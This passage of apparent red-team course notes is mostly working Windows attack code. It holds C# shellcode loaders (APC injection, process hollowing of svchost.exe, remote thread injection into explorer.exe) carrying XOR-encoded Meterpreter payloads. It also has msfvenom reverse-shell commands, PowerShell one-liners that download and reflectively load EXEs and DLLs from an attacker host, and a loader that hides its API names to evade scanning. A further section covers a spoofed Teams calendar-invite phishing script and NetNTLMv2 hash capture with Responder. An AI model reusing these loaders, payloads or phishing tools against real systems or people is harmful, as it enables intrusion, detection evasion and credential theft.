                IntPtr shellcodeAddr = AllocateMemory(pi.hProcess, shellcode.Length);
                WriteMemory(pi.hProcess, shellcodeAddr, shellcode);
                QueueAPC(pi.hThread, shellcodeAddr);
                ResumeThread(pi.hThread);
            }
            catch (Exception ex)
            {
                Console.WriteLine($"[!] Error: {ex.Message}");
            }
        }

        static PROCESS_INFORMATION CreateSuspendedProcess(string processPath)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi;
            bool success = CreateProcess(processPath, null, IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (!success)
                throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
            return pi;
        }

        static IntPtr AllocateMemory(IntPtr hProcess, int size)
        {
            IntPtr baseAddr = IntPtr.Zero;
            IntPtr regionSize = new IntPtr(size);
            uint status = (uint)NtAllocateVirtualMemory(hProcess, ref baseAddr, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
            if (status != 0)
                throw new Exception($"Memory allocation failed (0x{status:X8})");
            return baseAddr;
        }

        static void WriteMemory(IntPtr hProcess, IntPtr address, byte[] data)
        {
            uint status = NtWriteVirtualMemory(hProcess, address, data, (uint)data.Length, out _);
            if (status != 0)
                throw new Exception($"Memory write failed (0x{status:X8})");
        }

        static void QueueAPC(IntPtr hThread, IntPtr shellcodeAddr)
        {
            uint status = NtQueueApcThread(hThread, shellcodeAddr, IntPtr.Zero, IntPtr.Zero, IntPtr.Zero);
            if (status != 0)
                throw new Exception($"APC queue failed (0x{status:X8})");
        }

        static void ResumeThread(IntPtr hThread)
        {
            uint status = NtResumeThread(hThread, out _);
            if (status != 0)
                throw new Exception($"Thread resume failed (0x{status:X8})");
        }
    }
}

3.3.7 Process Hollow

Full process hollowing: start a legitimate process suspended, read its PEB to find the image base and entrypoint RVA, overwrite the entrypoint with XOR-decoded shellcode via WriteProcessMemory, then resume the process.

using System;
using System.Runtime.InteropServices;

class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct CLIENT_ID
    {
        public IntPtr UniqueProcess;
        public IntPtr UniqueThread;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_BASIC_INFORMATION
    {
        public IntPtr ExitStatus;
        public IntPtr PebAddress;
        public IntPtr AffinityMask;
        public IntPtr BasePriority;
        public IntPtr UniqueProcessId;
        public IntPtr InheritedFromUniqueProcessId;
    }

    const uint CREATE_SUSPENDED = 0x00000004;
    const int ProcessBasicInformation = 0;

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CreateProcess(
        string lpApplicationName, string lpCommandLine,
        IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,
        bool bInheritHandles, uint dwCreationFlags,
        IntPtr lpEnvironment, string lpCurrentDirectory,
        ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

    [DllImport("ntdll.dll")]
    static extern int NtQueryInformationProcess(
        IntPtr hProcess, int processInformationClass,
        ref PROCESS_BASIC_INFORMATION processInformation,
        uint processInformationLength, ref uint returnLength);

    [DllImport("ntdll.dll")]
    static extern int NtReadVirtualMemory(
        IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int NumberOfBytesToRead, out IntPtr lpNumberOfBytesRead);

    [DllImport("kernel32.dll")]
    static extern bool WriteProcessMemory(
        IntPtr hProcess, IntPtr lpBaseAddress,
        byte[] lpBuffer, int NumberOfBytesToWrite, out IntPtr lpNumberOfBytesWritten);

    [DllImport("ntdll.dll", SetLastError = true)]
    static extern bool NtResumeProcess(IntPtr hThread);

    static void Main()
    {
        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);

        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
        uint tmp = 0;
        IntPtr hProcess = pi.hProcess;
        NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

        IntPtr ptrImageBaseAddress = (IntPtr)((Int64)bi.PebAddress + 0x10);
        byte[] baseAddressBytes = new byte[IntPtr.Size];
        IntPtr nRead;
        NtReadVirtualMemory(hProcess, ptrImageBaseAddress, baseAddressBytes, baseAddressBytes.Length, out nRead);
        IntPtr imageBaseAddress = (IntPtr)(BitConverter.ToInt64(baseAddressBytes, 0));

        byte[] data = new byte[0x200];
        NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

        uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
        uint entrypointRvaOffset = e_lfanew + 0x28;
        uint entrypointRva = BitConverter.ToUInt32(data, (int)entrypointRvaOffset);
        IntPtr entrypointAddress = (IntPtr)((UInt64)imageBaseAddress + entrypointRva);

        // msfvenom -p windows/x64/meterpreter/reverse_tcp exitfunc=thread LHOST=[ip] LPORT=443 -f csharp
        // XOR'd with key 0xfa
        byte[] buf = new byte[511] { 0x06, 0xB2...};

        for (int i = 0; i < buf.Length; i++)
        {
            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
        }

        WriteProcessMemory(hProcess, entrypointAddress, buf, buf.Length, out nRead);
        NtResumeProcess(pi.hProcess);
    }
}

3.3.8 TryHarder

Remote shellcode loader by Sektor7 (ported to C# by saulgoodman): fetches a raw shellcode blob over HTTP into a suspended notepad.exe, allocates RWX memory, writes the payload, and executes via CreateRemoteThread. API names are stored as byte arrays and resolved at runtime to avoid static import scanning.

Generate and serve the shellcode:

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=tun0 LPORT=443 -f raw EXITFUNC=thread -o shellcode.bin
python3 -m http.server 80

Load and invoke the compiled EXE from memory (reflective load):

$data = (New-Object System.Net.WebClient).DownloadData('http://[ip]/Tryharder.exe')
$assem = [System.Reflection.Assembly]::Load($data)
$assem.EntryPoint.Invoke($null, @([string[]]@()))

using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;

class Program
{
    [StructLayout(LayoutKind.Sequential)]
    public struct STARTUPINFO
    {
        public uint cb;
        public string lpReserved;
        public string lpDesktop;
        public string lpTitle;
        public uint dwX;
        public uint dwY;
        public uint dwXSize;
        public uint dwYSize;
        public uint dwXCountChars;
        public uint dwYCountChars;
        public uint dwFillAttribute;
        public uint dwFlags;
        public ushort wShowWindow;
        public ushort cbReserved2;
        public IntPtr lpReserved2;
        public IntPtr hStdInput;
        public IntPtr hStdOutput;
        public IntPtr hStdError;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct PROCESS_INFORMATION
    {
        public IntPtr hProcess;
        public IntPtr hThread;
        public uint dwProcessId;
        public uint dwThreadId;
    }

    [DllImport("kernel32.dll")]
    private static extern bool ResumeThread(IntPtr hThread);

    [DllImport("kernel32.dll")]
    private static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, out IntPtr lpThreadId);

    private static string DecryptString(byte[] encryptedData)
    {
        return Encoding.UTF8.GetString(encryptedData);
    }

    // API names stored as byte arrays to avoid static import detection
    private static readonly byte[] encCreateProcess = { 0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x41, 0x00 };
    private static readonly byte[] encWriteProcessMemory = { 0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6F, 0x63, 0x65, 0x73, 0x73, 0x4D, 0x65, 0x6D, 0x6F, 0x72, 0x79, 0x00 };
    private static readonly byte[] encVirtualAllocEx = { 0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6C, 0x41, 0x6C, 0x6C, 0x6F, 0x63, 0x45, 0x78, 0x00 };

    private delegate bool WriteProcessMemoryFunc(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out IntPtr lpNumberOfBytesWritten);
    private static readonly WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encWriteProcessMemory)), typeof(WriteProcessMemoryFunc));

    private delegate bool CreateProcessAFunc(string lpApplicationName, string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);
    private static readonly CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encCreateProcess)), typeof(CreateProcessAFunc));

    private delegate IntPtr VirtualAllocExFunc(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    private static readonly VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)Marshal.GetDelegateForFunctionPointer(GetProcAddress(GetModuleHandle("kernel32.dll"), DecryptString(encVirtualAllocEx)), typeof(VirtualAllocExFunc));

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);

    static void Main()
    {
        Thread.Sleep(10000);

        // Fetch raw shellcode from attacker-controlled server
        string url = "http://[ip]/shellcode.bin";
        byte[] payload = new WebClient().DownloadData(url);

        STARTUPINFO si = new STARTUPINFO();
        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

        if (!pwCreateProcess("C:\\Windows\\System32\\notepad.exe", null, IntPtr.Zero, IntPtr.Zero, false, 0x00000004, IntPtr.Zero, null, ref si, out pi))
        {
            return;
        }

        IntPtr victimProcess = pi.hProcess;
        IntPtr shellAddress = pwVirtualAllocEx(victimProcess, IntPtr.Zero, (uint)payload.Length, 0x00001000 | 0x00002000, 0x40);
        IntPtr bytesWritten;

        pwProcmem(victimProcess, shellAddress, payload, (uint)payload.Length, out bytesWritten);

        IntPtr threadId;
        CreateRemoteThread(victimProcess, IntPtr.Zero, 0, shellAddress, IntPtr.Zero, 0, out threadId);
    }
}

3.3.9 DLL

2.3.9.1 Shellcode Hollower

Load ProcessHollowingDLL remotely via reflection, then inject shellcode into a suspended svchost.exe and resume it.

$data = (New-Object System.Net.WebClient).DownloadData('http://[ip]/run.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("ProcessHollowingDLL.ProcessHollowing")
$method = $class.GetMethod("PerformProcessHollowing")
$method.Invoke($null, $null)

using System;
using System.Runtime.InteropServices;

namespace ProcessHollowingDLL
{
    public class ProcessHollowing
    {
        [StructLayout(LayoutKind.Sequential)]
        public struct STARTUPINFO
        {
            public uint cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public uint dwX;
            public uint dwY;
            public uint dwXSize;
            public uint dwYSize;
            public uint dwXCountChars;
            public uint dwYCountChars;
            public uint dwFillAttribute;
            public uint dwFlags;
            public ushort wShowWindow;
            public ushort cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public uint dwProcessId;
            public uint dwThreadId;
        }

        [StructLayout(LayoutKind.Sequential)]
        public struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr ExitStatus;
            public IntPtr PebAddress;
            public IntPtr AffinityMask;
            public IntPtr BasePriority;
            public IntPtr UniqueProcessId;
            public IntPtr InheritedFromUniqueProcessId;
        }

        const uint CREATE_SUSPENDED = 0x00000004;
        const int ProcessBasicInformation = 0;

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool CreateProcess(
            string lpApplicationName,
            string lpCommandLine,
            IntPtr lpProcessAttributes,
            IntPtr lpThreadAttributes,
            bool bInheritHandles,
            uint dwCreationFlags,
            IntPtr lpEnvironment,
            string lpCurrentDirectory,
            ref STARTUPINFO lpStartupInfo,
            out PROCESS_INFORMATION lpProcessInformation
        );

        [DllImport("ntdll.dll")]
        static extern int NtQueryInformationProcess(
            IntPtr hProcess,
            int processInformationClass,
            ref PROCESS_BASIC_INFORMATION processInformation,
            uint processInformationLength,
            ref uint returnLength
        );

        [DllImport("ntdll.dll")]
        static extern int NtReadVirtualMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int NumberOfBytesToRead,
            out IntPtr lpNumberOfBytesRead
        );

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            byte[] lpBuffer,
            int NumberOfBytesToWrite,
            out IntPtr lpNumberOfBytesWritten
        );

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern int NtResumeThread(IntPtr hThread, out uint lpPreviousSuspendCount);

        public static void PerformProcessHollowing()
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
            si.cb = (uint)Marshal.SizeOf(typeof(STARTUPINFO));

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero, IntPtr.Zero, false, CREATE_SUSPENDED, IntPtr.Zero, null, ref si, out pi);
            if (!res) return;

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            NtQueryInformationProcess(hProcess, ProcessBasicInformation, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrImageBaseAddress = (IntPtr)((long)bi.PebAddress + 0x10);

            byte[] data = new byte[0x200];
            NtReadVirtualMemory(hProcess, imageBaseAddress, data, data.Length, out nRead);

            uint e_lfanew = BitConverter.ToUInt32(data, 0x3C);
            uint entrypointRvaOffset = e_lfanew + 0x28;

2.3.9.2 Shellcode Inject

Load Inject DLL remotely; injects XOR-decoded shellcode into a running explorer process via NT API calls.

$data = (New-Object System.Net.WebClient).DownloadData('http://[ip]/run.dll')
$assem = [System.Reflection.Assembly]::Load($data)
$class = $assem.GetType("Inject.Injector")
$method = $class.GetMethod("InjectShellcode")
$method.Invoke($null, $null)

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    public class Injector
    {
        private static readonly uint PAGE_EXECUTE_READWRITE = 0x40;
        private static readonly uint MEM_COMMIT = 0x1000;
        private static readonly uint MEM_RESERVE = 0x2000;

        [StructLayout(LayoutKind.Sequential)]
        public struct CLIENT_ID
        {
            public IntPtr UniqueProcess;
            public IntPtr UniqueThread;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 0)]
        public struct OBJECT_ATTRIBUTES
        {
            public int Length;
            public IntPtr RootDirectory;
            public IntPtr ObjectName;
            public uint Attributes;
            public IntPtr SecurityDescriptor;
            public IntPtr SecurityQualityOfService;
        }

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtOpenProcess(ref IntPtr ProcessHandle, UInt32 AccessMask, ref OBJECT_ATTRIBUTES ObjectAttributes, ref CLIENT_ID clientId);

        [DllImport("ntdll.dll")]
        static extern IntPtr NtAllocateVirtualMemory(IntPtr processHandle, ref IntPtr baseAddress, IntPtr zeroBits, ref IntPtr regionSize, uint allocationType, uint protect);

        [DllImport("ntdll.dll")]
        static extern int NtWriteVirtualMemory(IntPtr processHandle, IntPtr baseAddress, byte[] buffer, uint bufferSize, out uint written);

        [DllImport("ntdll.dll", SetLastError = true)]
        static extern uint NtCreateThreadEx(out IntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, [MarshalAs(UnmanagedType.Bool)] bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer);

        public static void InjectShellcode()
        {
            Process[] targetProcess = Process.GetProcessesByName("explorer");
            IntPtr htargetProcess = targetProcess[0].Handle;

            IntPtr hProcess = IntPtr.Zero;
            CLIENT_ID clientid = new CLIENT_ID();
            clientid.UniqueProcess = new IntPtr(targetProcess[0].Id);
            clientid.UniqueThread = IntPtr.Zero;
            OBJECT_ATTRIBUTES ObjectAttributes = new OBJECT_ATTRIBUTES();

            uint status = NtOpenProcess(ref hProcess, 0x001F0FFF, ref ObjectAttributes, ref clientid);

            // XOR'd with key: 0xfa
            byte[] buf = new byte[511] { 0x06, 0xB2, 0x79, 0x1E, 0x0A, 0x12, 0x36, 0xFA, 0xFA, 0xFA, 0xBB, 0xAB, 0xBB, 0xAA, 0xA8, 0xAB, 0xAC, 0xB2, 0xCB, 0x28, 0x9F, 0xB2, 0x71, 0xA8, 0x9A, 0xB2, 0x73, 0x0A, 0xB2, 0x73, 0x20, 0xB2, 0x73, 0x03, 0xBB, 0x40, 0xF8, 0x23, 0x32, 0xA5, 0x05, 0x2F, 0x79, 0x02, 0xFA, 0x87, 0xD2, 0xA2, 0xBB, 0xAD, 0xA3, 0x92, 0xFA, 0xBA, 0xFA, 0xFA, 0xBB, 0xA2, 0x90, 0xFA, 0xA0, 0xBB, 0x40, 0xF1, 0xD5, 0xF5, 0xCA, 0x05, 0x2F, 0xAD, 0xA3, 0xBB, 0x40, 0x8F, 0x94, 0xB7, 0x9B, 0x05, 0x2F, 0xB3, 0x05, 0x34, 0x13, 0xC6, 0x05, 0x05, 0x05, 0xB2, 0xFB, 0x39, 0xB2, 0xD3, 0x3C, 0xB2, 0x7F, 0x0C, 0x8F, 0x4E, 0xBB, 0x05, 0x1D, 0xA2, 0x90, 0xFA, 0xA3, 0x41, 0x1A, 0xE7, 0xD0, 0xF0, 0xBB, 0x73, 0x20, 0x05, 0x2F };

            IntPtr baseAddress = new IntPtr();
            IntPtr regionSize = (IntPtr)buf.Length;
            NtAllocateVirtualMemory(hProcess, ref baseAddress, IntPtr.Zero, ref regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

            for (int j = 0; j < buf.Length; j++)
                buf[j] = (byte)((uint)buf[j] ^ 0xfa);

            NtWriteVirtualMemory(hProcess, baseAddress, buf, (uint)buf.Length, out uint wr);

            IntPtr hRemoteThread;
            NtCreateThreadEx(out hRemoteThread, 0x1FFFFF, IntPtr.Zero, htargetProcess, (IntPtr)baseAddress, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
        }
    }
}

3.4 Phishing with Calendars

Deliver an iCalendar (ICS) meeting invite as an email attachment to bypass email filters and lower user skepticism. Mimic a Microsoft Teams invite, then weaponize the "join" link to harvest NetNTLMv2 hashes with Responder.

3.4.1 ICS File Structure

An ICS file is plain text (RFC 5545). The fields adversaries manipulate are ORGANIZER (trusted sender), DTSTART/DTEND (business hours), DESCRIPTION (phishing URL), and UID (unique, to evade filters).

Field Purpose / abuse
ORGANIZER;CN="[user]":mailto:[user]@[domain] Event owner — spoof a trusted sender
DTSTART;TZID=UTC:20241010T073059Z Start time — set to plausible business hours
DTEND;TZID=UTC:20241010T083059Z End time
DESCRIPTION:http://[attacker-ip] Carries the malicious link / instructions
UID:FIXMEUID... Unique ID — randomize per send to appear as a distinct entry and bypass filters

3.4.2 Custom ICS Invite

Minimal weaponized invite — set ORGANIZER to a trusted name and embed the phishing URL in DESCRIPTION.

BEGIN:VCALENDAR
PRODID:Microsoft Exchange Server 2022
VERSION:2.0
CALSCALE:GREGORIAN
METHOD:REQUEST
BEGIN:VTIMEZONE
TZID:UTC
BEGIN:STANDARD
DTSTART:20241010T073659Z
TZOFFSETFROM:+0000
TZOFFSETTO:+0000
END:STANDARD
END:VTIMEZONE
BEGIN:VEVENT
DTSTART;TZID=UTC:20241010T073059Z
DTEND;TZID=UTC:20241010T083059Z
DTSTAMP:20241010T034159Z
ORGANIZER;CN=[user]:mailto:[user]@[domain]
UID:FIXMEUID20241010T034159Z
CREATED:20241010T034159Z
DESCRIPTION:http://[attacker-ip]
LAST-MODIFIED:20241010T034159Z
LOCATION:Microsoft Teams Meeting
SEQUENCE:0
STATUS:CONFIRMED
SUMMARY:HR meeting
TRANSP:OPAQUE
END:VEVENT
END:VCALENDAR

3.4.3 Sending the Invite

Send the HTML body and attach the ICS with sendEmail (-s SMTP server, -a attachment, -o message-content-type=html).

sendEmail -s [smtp_ip] -t [target]@[domain] -f attacker@[domain] -u "Urgent HR meeting" -o message-content-type=html -o message-file=./email.html -a iCalendar.ics

Spoof a legitimate Teams invite in the HTML body — replace every href with the attacker URL.

<p class=MsoNormal style='background:white'><span style='font-size:18.0pt;font-family:"Segoe UI",sans-serif;color:#252424'>Microsoft Teams meeting</span></p>
<p class=MsoNormal style='background:white'><b><span style='font-size:10.5pt;font-family:"Segoe UI",sans-serif;color:#252424'>Join on your computer or mobile app</span></b></p>
<p class=MsoNormal style='background:white'><a href="http://[attacker-ip]" target="_blank"><span style='font-size:10.5pt;font-family:"Segoe UI Semibold",sans-serif;color:#6264A7'>Click here to join the meeting</span></a></p>
<p class=MsoNormal style='background:white'><a href="https://aka.ms/JoinTeamsMeeting" target="_blank"><span style='color:#6264A7'>Learn More</span></a> | <a href="http://[attacker-ip]" target="_blank"><span style='color:#6264A7'>Meeting options</span></a></p>

3.4.4 Automating the Attack

Build templates with placeholders ({DTSTART}, {ORGANIZER_EMAIL}, {DESCRIPTION}, {ATTENDEES}, {EVENT_URL}) and fill them at runtime. Adding fake high-value ATTENDEE entries (CEO/CTO) boosts credibility. The script attaches the ICS as text/calendar;method=REQUEST so it renders as a real invite.

#!/usr/bin/env python3
# fakeics.py — automated calendar-invite phishing (inspired by FakeMeeting)
# Usage: python3 fakeics.py <smtp_server> <sender_email> <recipient> <event_url>
import time, codecs, smtplib, datetime, sys
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email.encoders import encode_base64
from email.mime.multipart import MIMEMultipart
from email.utils import formatdate

EMAIL_SUBJECT = "HR Meeting"
EVENT_SUMMARY = "HR meeting"
ORGANIZER_NAME = "HR Team Corp1"
ATTENDEES = ["ceo@[domain]", "cto@[domain]"]
EVENT_TEXT = "Dear colleague,\n\nAn important HR meeting regarding company-wide policy changes is scheduled. Your attendance is required.\n\nBest regards,\nHR Team"

def load_template():
    with codecs.open("email_template.html", 'r', 'utf-8') as f:
        return f.read()

def load_ics():
    with codecs.open("iCalendar_template.ics", 'r', 'utf-8') as f:
        return f.read()

def generate_attendees():
    out = []
    for a in ATTENDEES:
        out.append("ATTENDEE;CUTYPE=INDIVIDUAL;ROLE=REQ-PARTICIPANT;PARTSTAT=ACCEPTED;RSVP=FALSE\r\n ;CN={a};X-NUM-GUESTS=0:\r\n mailto:{a}".format(a=a))
    return "\r\n".join(out)

def prepare_template(event_url):
    return load_template().format(EVENT_TEXT=EVENT_TEXT, EVENT_URL=event_url)

def prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url):
    return load_ics().format(DTSTAMP=dtstamp, DTSTART=dtstart, DTEND=dtend,
        ORGANIZER_NAME=ORGANIZER_NAME, ORGANIZER_EMAIL=sender_email,
        DESCRIPTION=event_url, SUMMARY=EVENT_SUMMARY, ATTENDEES=generate_attendees())

def send_email(smtp_server, sender_email, to, event_url):
    print('Sending email to: ' + to)
    utc_offset = time.localtime().tm_gmtoff / 60
    ddtstart = datetime.datetime.now() - datetime.timedelta(minutes=utc_offset + 5)  # started 5 min ago
    dtend = ddtstart + datetime.timedelta(hours=1)
    dtstamp = datetime.datetime.now().strftime("%Y%m%dT%H%M%SZ")
    dtstart = ddtstart.strftime("%Y%m%dT%H%M%SZ")
    dtend = dtend.strftime("%Y%m%dT%H%M%SZ")

    ics = prepare_ics(dtstamp, dtstart, dtend, sender_email, event_url)
    email_body = prepare_template(event_url)

    msg = MIMEMultipart('mixed')
    msg['Reply-To'] = sender_email
    msg['Date'] = formatdate(localtime=True)
    msg['Subject'] = EMAIL_SUBJECT
    msg['From'] = sender_email
    msg['To'] = to

    part_email = MIMEText(email_body, "html")
    part_cal = MIMEText(ics, 'calendar;method=REQUEST')

    alt = MIMEMultipart('alternative')
    msg.attach(alt)

    ics_atch = MIMEBase('application/ics', ' ;name="invite.ics"')
    ics_atch.set_payload(ics)
    encode_base64(ics_atch)
    ics_atch.add_header('Content-Disposition', 'attachment; filename="invite.ics"')

    alt.attach(part_email)
    alt.attach(part_cal)

    server = smtplib.SMTP(smtp_server, 25)
    server.ehlo()
    server.sendmail(sender_email, to, msg.as_string())
    server.close()

def main():
    if len(sys.argv) != 5:
        print("Usage: python3 fakeics.py <smtp_server> <sender_email> <recipient> <event_url>")
        sys.exit(1)
    send_email(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])

if __name__ == "__main__":
    main()

python3 fakeics.py [smtp_ip] hr@[domain] [target]@[domain] http://[attacker-ip]

3.4.5 Credential Stealing with Responder

Point the "join" link at your Kali IP. When the victim clicks it, Responder serves a fake Windows Security prompt and captures the NetNTLMv2 hash on authentication.

sudo responder -I tun0

Crack the captured hash (mode 5600 = NetNTLMv2).

hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt

3.5 Process Injection & Migration

Move a shell out of its host process (e.g. a Word macro or PowerShell runner) into a longer-lived, less suspicious one. Inject into explorer.exe (persists until logoff) or migrate to svchost.exe (legitimately generates network traffic). You can only inject into a process at the same or lower integrity level as the current one.

Technique Mechanism Disk?
Remote thread injection VirtualAllocEx + WriteProcessMemory + CreateRemoteThread No
DLL injection CreateRemoteThread on LoadLibraryA with DLL path as arg Yes (DLL on disk)
Reflective DLL injection PE parsed + mapped manually in memory (Invoke-ReflectivePEInjection) No
Process hollowing CREATE_SUSPENDED + overwrite EntryPoint + ResumeThread No

32-bit -> 64-bit injection fails — CreateRemoteThread does not support it. The other three migration paths work. Use PROCESS_ALL_ACCESS = 0x001F0FFF, allocate with 0x3000 (MEM_COMMIT|MEM_RESERVE) and 0x40 (PAGE_EXECUTE_READWRITE).

3.5.1 Remote Thread Injection

Allocate memory in the target, write shellcode, and run it with a new thread. Resolve the target PID dynamically with Process.GetProcessesByName("explorer"). Build as x64 when injecting into a 64-bit process.

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args)
        {
            int pid = Process.GetProcessesByName("explorer")[0].Id;
            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);
            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ip] LPORT=443 -f csharp
            byte[] buf = new byte[591] { 0xfc,0x48,0x83,0xe4,0xf0,0xe8, /* ... */ 0xff,0xd5 };

            IntPtr outSize;
            WriteProcessMemory(hProcess, addr, buf, buf.Length, out outSize);
            CreateRemoteThread(hProcess, IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
        }
    }
}

3.5.2 DLL Injection

Inject an entire unmanaged DLL instead of raw shellcode. The trick is to call CreateRemoteThread with LoadLibraryA as the start address and the DLL path as its argument. Constraints worth remembering:

  • The DLL must be unmanaged C/C++ — a managed C# DLL cannot load into an unmanaged process.
  • Put the shellcode in the DLL_PROCESS_ATTACH case of DllMain so it runs on load (no GetProcAddress needed remotely).
  • LoadLibraryA only loads from disk, so the DLL must be written to disk first.
  • LoadLibraryA's address is the same across processes (native DLLs share a base address), so resolve it locally with GetModuleHandle + GetProcAddress.
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=[ip] LPORT=443 -f dll -o /var/www/html/met.dll

using System;
using System.Diagnostics;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;

namespace Inject
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr OpenProcess(uint processAccess, bool bInheritHandle, int processId);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
